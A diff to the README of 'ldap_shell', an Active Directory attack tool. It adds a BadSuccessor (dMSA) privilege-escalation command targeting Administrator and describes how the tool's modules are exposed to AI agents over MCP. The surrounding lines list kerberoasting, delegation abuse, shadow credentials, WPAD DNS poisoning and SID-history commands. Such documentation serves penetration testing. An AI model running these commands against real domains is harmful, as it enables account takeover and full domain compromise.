@@ -52,6 +52,7 @@ ldap_shell domain.local/user:password get_kerberoast
 ldap_shell domain.local/user:password set_delegation WEB01$ add cifs/dc.domain.local
 ldap_shell domain.local/user:password set_keycred john add
 ldap_shell domain.local/user:password set_dns wpad add A 10.0.0.5
+ldap_shell domain.local/user:password set_badsuccessor add Administrator
 ```
 
 `-non-interactive` reads commands from stdin (one per line).
@@ -64,7 +65,7 @@ ldap_shell domain.local/user:password --mcp
 LDAP_SHELL_TARGET='domain.local/user:password' ldap_shell-mcp
 ```
 
-Tools: `connect`, `status`, `list_commands`, `run`.
+Tools: `connect`, `status`, `list_commands`, `run`. Every shell module is a `run` command (`get_kerberoast`, `set_keycred john add`, …). `connect` accepts the same `-pfx` / `-cert-auth` options.
 
 ## Functionality
 
@@ -87,6 +88,7 @@ Get Info
 
 Abuse ACL
     add_sid_history target sid_or_group - Add a SID to sIDHistory
+    set_badsuccessor action [victim] [ou|dmsa] [name] - dMSA / BadSuccessor
     add_user_to_group user group - Add a user to a group
     change_password user [password] - Change password (needs LDAPS/StartTLS)
     clear_rbcd target [grantee] - Clear RBCD
